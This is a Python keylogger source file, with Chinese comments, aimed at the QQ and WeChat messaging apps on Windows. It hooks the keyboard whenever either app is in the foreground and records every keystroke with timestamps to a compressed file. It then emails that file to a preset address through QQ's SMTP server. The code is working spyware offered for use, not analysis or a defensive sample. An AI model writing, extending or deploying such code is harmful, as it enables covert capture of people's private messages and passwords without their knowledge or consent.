import os
import struct
import zlib
import time
import keyboard
import threading
import psutil
import win32gui
import win32process
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# 发件人和收件人信息
from_addr = "your_email@example.com"
to_addr = "recipient_email@example.com"
password = "your_email_password_or_smtp_token"
compressed_file = "D:\\key_data.bin"

key_encoding = {
    # 字母键
    'a': 0x61, 'b': 0x62, 'c': 0x63, 'd': 0x64, 'e': 0x65,
    'f': 0x66, 'g': 0x67, 'h': 0x68, 'i': 0x69, 'j': 0x6A,
    'k': 0x6B, 'l': 0x6C, 'm': 0x6D, 'n': 0x6E, 'o': 0x6F,
    'p': 0x70, 'q': 0x71, 'r': 0x72, 's': 0x73, 't': 0x74,
    'u': 0x75, 'v': 0x76, 'w': 0x77, 'x': 0x78, 'y': 0x79,
    'z': 0x7A,

    # 数字键 (统一普通数字键和小键盘数字键)
    '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34,
    '5': 0x35, '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39,

    # 功能键
    'F1': 0x70, 'F2': 0x71, 'F3': 0x72, 'F4': 0x73, 'F5': 0x74,
    'F6': 0x75, 'F7': 0x76, 'F8': 0x77, 'F9': 0x78, 'F10': 0x79,
    'F11': 0x7A, 'F12': 0x7B,

    # 特殊字符键
    'space': 0x20, 'enter': 0x0D, 'backspace': 0x08, 'tab': 0x09,
    'escape': 0x1B, 'ctrl': 0x81, 'shift': 0x82, 'alt': 0x83,
    'caps_lock': 0x84, 'num_lock': 0x85, 'scroll_lock': 0x86,

    # 符号键（含Shift修饰符的键）
    '-': 0x2D, '=': 0x3D, '[': 0x5B, ']': 0x5D, '\\': 0x5C,
    ';': 0x3B, '\'': 0x27, ',': 0x2C, '.': 0x2E, '/': 0x2F,

    # 需要Shift键的符号
    '!': 0x21, '@': 0x40, '#': 0x23, '$': 0x24, '%': 0x25,
    '^': 0x5E, '&': 0x26, '*': 0x2A, '(': 0x28, ')': 0x29,
    '_': 0x5F, '+': 0x2B, '{': 0x7B, '}': 0x7D, ':': 0x3A,
    '"': 0x22, '<': 0x3C, '>': 0x3E, '?': 0x3F, '|': 0x7C,
    '~': 0x7E, '《': 0x300A, '》': 0x300B, '？': 0xFF1F, 
    '：': 0xFF1A, '“': 0x201C, '”': 0x201D, '｛': 0xFF5B, 
    '｝': 0xFF5D, '——': 0x2014, '+': 0x2B, '~': 0x7E, 
    '！': 0xFF01, '￥': 0xFFE5, '%': 0xFF05, '…': 0x2026, 
    '＆': 0xFF06, '*': 0xFF0A, '（': 0xFF08, '）': 0xFF09,

    # 导航键
    'insert': 0x90, 'delete': 0x91, 'home': 0x92, 'end': 0x93,
    'page_up': 0x94, 'page_down': 0x95, 'arrow_up': 0x96,
    'arrow_down': 0x97, 'arrow_left': 0x98, 'arrow_right': 0x99,

    # 小键盘其他键
    'numpad_decimal': 0x6E, 'numpad_add': 0x6B,
    'numpad_subtract': 0x6D, 'numpad_multiply': 0x6A, 'numpad_divide': 0x6F,

    # 其他可能的按键
    'print_screen': 0x9A, 'pause': 0x9B, 'menu': 0x9C, 'windows': 0x9D
}

# 全局变量声明
last_key = None
key_counter = {}
window_title_dict = {}
window_title_index = 0
recorded_data = []
current_window_title = None

def send_email(filepath, subject_date):
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = f"{subject_date}的记录"

    filename = os.path.basename(filepath)
    with open(filepath, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={filename}')
        msg.attach(part)

    try:
        server = smtplib.SMTP_SSL('smtp.qq.com', 465)
        server.login(from_addr, password)
        server.sendmail(from_addr, to_addr, msg.as_string())
        server.quit()
        print("邮件发送成功！")
    except Exception as e:
        print(f"邮件发送失败: {e}")

def check_time_and_send_email():
    if not os.path.exists(compressed_file):
        return False

    with open(compressed_file, 'rb') as file:
        compressed_data = file.read()
        if not compressed_data:
            return False

        raw_data = zlib.decompress(compressed_data)
        if len(raw_data) < 12:
            return False

        # 读取最后一列的时间戳
        first_timestamp = struct.unpack('d', raw_data[-8:])[0]
        print(f"First timestamp: {first_timestamp}")
        current_time = time.time()

        if current_time - first_timestamp >= 3600:  # 24 hours in seconds
            subject_date = datetime.fromtimestamp(first_timestamp).strftime('%Y/%m/%d')
            send_email(compressed_file, subject_date)
            return True
    return False

def save_compressed_file():
    global window_title_dict, window_title_index, recorded_data

    if not recorded_data:
        print("No data to save")
        return

    if check_time_and_send_email():
        print("24小时内，已发送邮件。覆盖写入新数据...")

    raw_data = bytearray()
    for window_title, key_name, count, timestamp in recorded_data:
        if window_title not in window_title_dict:
            window_title_dict[window_title] = window_title_index
            title_index = window_title_index
            window_title_index += 1
            title_encoded = True
        else:
            title_index = window_title_dict[window_title]
            title_encoded = False

        try:
            key_code = key_encoding[key_name]
        except KeyError:
            continue

        raw_data.append(title_index)
        if title_encoded:
            title_bytes = window_title.encode('utf-8')
            raw_data.append(len(title_bytes))
            raw_data.extend(title_bytes)

        raw_data.append(key_code)
        raw_data.append(count)
        raw_data.extend(struct.pack('d', timestamp))

    if raw_data:
        compressed_data = zlib.compress(raw_data)
        with open(compressed_file, 'wb') as file:
            file.write(compressed_data)
        print(f"Data saved successfully to {compressed_file} with window title '{current_window_title}'")

    recorded_data.clear()

def record_last_key():
    global last_key, key_counter, current_window_title
    if last_key and last_key in key_counter:
        recorded_data.append((current_window_title, last_key, key_counter[last_key]["count"], key_counter[last_key]["timestamp"]))
        last_key = None

def on_key_event(e):
    global last_key, last_timer, current_window_title
    if e.event_type == "down":
        key_name = e.name
        timestamp = round(time.time(), 2)

        if key_name == last_key:
            key_counter[key_name]["count"] += 1
        else:
            if last_key and last_key in key_counter:
                record_last_key()
            key_counter[key_name] = {"count": 1, "timestamp": timestamp}
            last_key = key_name

def get_qq_and_wechat_pids():
    qq_pids = []
    wechat_pids = []
    for proc in psutil.process_iter(['pid', 'name']):
        if 'QQ' in proc.info['name']:
            qq_pids.append(proc.info['pid'])
        if 'WeChat' in proc.info['name']:
            wechat_pids.append(proc.info['pid'])
    return qq_pids, wechat_pids

def get_foreground_window_info():
    hwnd = win32gui.GetForegroundWindow()
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    title = win32gui.GetWindowText(hwnd)
    return pid, title

def is_app_active(app_pids):
    fg_window_pid, fg_window_title = get_foreground_window_info()
    if fg_window_pid in app_pids:
        return True, fg_window_title
    return False, None

def main():
    global current_window_title
    last_state = None
    qq_pids, wechat_pids = get_qq_and_wechat_pids()

    while True:
        qq_active, qq_window_title = is_app_active(qq_pids)
        wechat_active, wechat_window_title = is_app_active(wechat_pids)

        if qq_active:
            if last_state != "QQ":
                if last_state == "WeChat":
                    print(f"WeChat has gone to the background. Stopping key logging...")
                    keyboard.unhook_all()
                    record_last_key()
                    save_compressed_file()
                    key_counter.clear()
                current_window_title = "QQ"
                print("QQ is active. Starting to log keys...")
                keyboard.hook(on_key_event)
                last_state = "QQ"
        elif wechat_active:
            if last_state != "WeChat":
                if last_state == "QQ":
                    print(f"QQ has gone to the background. Stopping key logging...")
                    keyboard.unhook_all()
                    record_last_key()
                    save_compressed_file()
                    key_counter.clear()
                current_window_title = "WeChat"
                print("WeChat is active. Starting to log keys...")
                keyboard.hook(on_key_event)
                last_state = "WeChat"
        else:
            if last_state in ["QQ", "WeChat"]:
                print(f"{current_window_title} has gone to the background. Stopping key logging...")
                keyboard.unhook_all()
                record_last_key()  # 记录最后一个按键
                save_compressed_file()  # 保存所有数据
                key_counter.clear()  # 清空按键计数器
                last_state = None

        time.sleep(0.5)  # 每秒检测一次，可以根据需要调整检测频率

if __name__ == "__main__":
    main()
